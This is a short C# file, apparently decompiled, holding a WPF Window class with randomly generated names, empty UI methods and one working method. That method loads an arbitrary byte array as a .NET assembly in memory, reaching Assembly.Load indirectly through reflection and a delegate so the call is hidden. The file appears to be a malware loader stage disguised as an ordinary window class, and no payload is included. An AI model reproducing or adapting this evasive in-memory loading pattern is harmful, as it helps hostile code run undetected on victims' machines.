using System;
using System.Reflection;
using System.Windows;
using System.Windows.Markup;

namespace hbekdjgum;

public class nqakknyvd : Window, IComponentConnector
{
	internal delegate Assembly malspnfqh(byte[] byte_0);

	public void InitializeComponent()
	{
	}

	public static Assembly AppDomainLoad(byte[] spjxbrjfa)
	{
		return ((malspnfqh)Delegate.CreateDelegate(typeof(malspnfqh), typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }) ?? throw new InvalidOperationException()))(spjxbrjfa);
	}

	private void r(int connectionId, object target)
	{
	}
}
